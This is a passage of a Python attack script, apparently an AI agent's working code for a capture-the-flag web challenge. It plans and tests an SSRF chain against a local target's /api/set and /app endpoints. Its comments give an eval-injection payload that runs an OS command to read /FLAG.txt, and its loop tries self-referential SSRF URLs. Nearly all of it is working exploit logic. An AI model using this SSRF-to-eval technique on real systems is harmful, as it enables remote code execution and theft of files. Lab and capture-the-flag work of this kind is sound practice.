    # Check if response contains JSON that would be passed to eval
    if "{" in app_resp.text and "script" in app_resp.text:
        print("    [INFO] Found JSON-like content with 'script' key")

import requests

target_base = "http://127.0.0.1:32985"

# Let me check what the /api/set endpoint actually does
# by looking at the nginx routing

# First, check what http://nginx/api/get returns directly
# Based on the error, it says it fetches from 'http://nginx/api/get'

print("[+] Testing direct access to nginx via SSRF...")

# Let's see if we can chain the SSRF
# The error shows: script = requests.get(api).text where api comes from /api/get

# So the flow is:
# 1. User sets URL via /api/set?url=XXX (this is stored in flask_api)
# 2. /app calls http://nginx/api/get which returns the stored URL
# 3. /app then calls requests.get(api) where api = stored URL
# 4. The result is eval'd

# To exploit this, we need to set the URL to something that returns:
# {"script": "__import__('os').popen('cat /FLAG.txt').read()"}

# The issue is the target needs to reach our malicious server
# Let me try using 127.0.0.1 or localhost from the target's perspective

# From the target container, localhost/127.0.0.1 IS the target itself
# So if we can make the target SSRF to itself and serve the payload...

urls_to_try = [
    # Self-reference - the target can talk to itself
    "http://127.0.0.1:8080/payload",
    "http://localhost:8080/payload", 
    "http://0.0.0.0:8080/payload",
    # Try to hit the target's own API
    "http://127.0.0.1:32985/payload",
]

for url in urls_to_try:
    print(f"\n[+] Testing self-referential SSRF: {url}")
    set_resp = requests.get(f"{target_base}/api/set?url={url}", timeout=10)
    print(f"    /api/set: {set_resp.status_code}")
    
    app_resp = requests.get(f"{target_base}/app", timeout=10)
    print(f"    /app: {app_resp.status_code}")
    print(f"    Response snippet: {app_resp.text[:300]}")

